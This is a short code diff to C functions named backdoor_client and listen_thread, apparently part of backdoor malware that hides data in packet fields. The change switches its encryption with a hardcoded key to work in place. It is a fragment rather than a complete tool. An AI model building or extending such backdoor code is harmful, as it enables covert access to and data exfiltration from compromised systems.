@@ -42,7 +42,6 @@ void backdoor_client(uint32 ipaddr, int chan)
 		for (int i = 0; i < tot_len; i += 8)
 		{
 			char frame[FRAM_SZ];
-//			char *enc;
 			char *ptr;
 			int fram_len;
 			uint16 src_port = 0;
@@ -54,7 +53,7 @@ void backdoor_client(uint32 ipaddr, int chan)
 
 			memcpy(frame, ptr, fram_len);
 
-//			enc = encrypt(SEKRET, frame, FRAM_SZ);
+			encrypt(SEKRET, frame, FRAM_SZ);
 
 			for (int j = 0; j < FRAM_SZ; ++j)
 			{
@@ -69,8 +68,6 @@ void backdoor_client(uint32 ipaddr, int chan)
 				usleep(SLEEP_TIME);
 				_send(ipaddr, src_port, dst_port, channel);
 			}
-
-//			free(enc);
 		}
 
 		free(trans);
@@ -97,7 +94,6 @@ void *listen_thread(void *arg)
 		char packet[MAX_LEN];
 		char *ptr;
 		char *data;
-//		char *dec;
 		char type;
 		uint32 *ip;
 
@@ -136,9 +132,10 @@ void *listen_thread(void *arg)
 
 		if (buf_len % FRAM_SZ != 0) // Check for frame
 			continue;
+		
+		data -= FRAM_SZ;
 
-		//		dec = decrypt(SEKRET, ptr, FRAM_SZ);
-		//		free(dec);
+		decrypt(SEKRET, data, FRAM_SZ);
 
 		// Step 7: see if we have a full transmission
 		data = getTransmission(buf, &buf_len, &type);
